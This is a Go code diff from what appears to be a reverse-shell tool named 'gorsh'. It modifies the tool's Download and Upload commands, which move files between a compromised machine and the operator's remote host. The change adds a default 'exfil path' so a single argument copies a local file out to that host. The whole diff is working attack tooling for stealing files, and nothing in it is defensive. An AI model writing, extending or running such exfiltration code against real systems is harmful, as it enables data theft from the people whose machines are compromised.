@@ -2,6 +2,7 @@ package cmds
 
 import (
 	"fmt"
+	"path/filepath"
 
 	"git.hyrule.link/blink/gorsh/pkg/fetch"
 	"git.hyrule.link/blink/gorsh/pkg/myconn"
@@ -10,7 +11,7 @@ import (
 
 func Download(c *ishell.Context) {
 	if len(c.Args) < 1 {
-		c.Println(c.Cmd.LongHelp)
+		c.Println(c.Cmd.Help)
 		return
 	}
 
@@ -19,7 +20,7 @@ func Download(c *ishell.Context) {
 		c.Args = append(c.Args, dst)
 	}
 
-	src := fmt.Sprintf("//%s/c/%s", myconn.Host(), c.Args[0])
+	src := fmt.Sprintf("//%s/%s", myconn.Host(), c.Args[0])
 	bytes, err := fetch.Get(src, c.Args[1])
 	if err != nil {
 		c.Println(err)
@@ -29,13 +30,20 @@ func Download(c *ishell.Context) {
 }
 
 func Upload(c *ishell.Context) {
-	if len(c.Args) != 2 {
-		c.Println(c.Cmd.LongHelp)
+	if len(c.Args) < 1 {
+		c.Println(c.Cmd.Help)
 		return
 	}
 
-	dst := fmt.Sprintf("//%s/c/%s", myconn.Host(), c.Args[0])
-	bytes, err := fetch.Copy(c.Args[1], dst)
+	// TODO: make default exfil path configurable
+	if len(c.Args) == 1 {
+		dst := filepath.Base(c.Args[0])
+		defaultExfil := fmt.Sprintf("e/%s", dst)
+		c.Args = append(c.Args, defaultExfil)
+	}
+
+	dst := fmt.Sprintf("//%s/%s", myconn.Host(), c.Args[1])
+	bytes, err := fetch.Copy(c.Args[0], dst)
 	if err != nil {
 		c.Println(err)
 		return
